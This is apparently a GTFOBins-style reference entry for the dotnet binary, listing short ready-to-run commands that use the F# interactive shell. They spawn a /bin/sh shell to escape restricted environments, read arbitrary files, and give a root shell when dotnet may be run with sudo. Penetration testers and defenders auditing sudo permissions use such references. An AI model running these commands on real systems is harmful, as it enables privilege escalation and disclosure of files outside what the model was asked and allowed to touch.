# GTFOBin: dotnet

## Shell

It can be used to break out from restricted environments by spawning an interactive system shell.

```
dotnet fsi
System.Diagnostics.Process.Start("/bin/sh").WaitForExit();;
```

## File read

It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.

```
export LFILE=file_to_read
dotnet fsi
System.IO.File.ReadAllText(System.Environment.GetEnvironmentVariable("LFILE"));;
```

## Sudo

If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

```
sudo dotnet fsi
System.Diagnostics.Process.Start("/bin/sh").WaitForExit();;
```